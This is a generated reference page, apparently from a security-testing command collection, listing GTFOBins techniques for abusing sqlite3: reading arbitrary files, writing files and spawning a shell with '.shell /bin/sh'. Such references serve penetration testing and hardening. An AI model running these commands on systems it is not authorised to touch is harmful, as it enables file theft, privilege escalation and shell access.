---
parsed_by: focuslocust
source: commands
type: generated
---
# sqlite3 Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## sqlite3

Tool page: [sqlite3](../../tools/linux/sqlite3.md)

### file-read

```text
sqlite3 <<EOF
CREATE TABLE x(x TEXT);
.import /path/to/input-file x
SELECT * FROM x;
EOF
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/sqlite3` |
| Evidence | Function example preserved from source parser. |

### file-write

```text
sqlite3 /dev/null -cmd '.output /path/to/output-file' 'select "DATA";'
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/sqlite3` |
| Evidence | Function example preserved from source parser. |

### shell

```text
sqlite3 /dev/null '.shell /bin/sh'
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/sqlite3` |
| Evidence | Function example preserved from source parser. |
